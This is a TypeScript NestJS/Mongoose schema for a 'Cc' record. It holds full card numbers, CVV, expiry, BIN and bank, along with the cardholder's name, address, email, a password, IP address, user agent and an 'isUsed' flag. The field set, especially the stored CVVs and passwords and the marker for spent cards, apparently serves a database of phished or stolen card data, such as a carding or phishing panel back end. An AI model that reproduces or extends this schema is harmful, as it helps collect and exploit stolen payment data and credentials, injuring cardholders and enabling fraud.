import { Schema, Prop, SchemaFactory } from '@nestjs/mongoose';
import { Document } from 'mongoose';

@Schema()
export class Cc extends Document {
  @Prop({unique: true})
  ccnum: string;

  @Prop()
  month: string;

  @Prop()
  year: string;

  @Prop()
  cvv: string;

  @Prop()
  bank: string;

  @Prop()
  country: string;

  @Prop()
  bin: string;

  @Prop()
  address: string;

  @Prop()
  phone: string;

  @Prop()
  zipcode: string;

  @Prop()
  state: string;

  @Prop()
  email: string;

  @Prop()
  note: string;

  @Prop()
  createDate: Date;

  @Prop()
  address2: string;

  @Prop()
  ip: string;

  @Prop()
  userAgent: string;

  @Prop()
  fullname: string;

  @Prop()
  password: string;

  @Prop()
  isUsed: boolean;
}

export const CcSchema = SchemaFactory.createForClass(Cc);
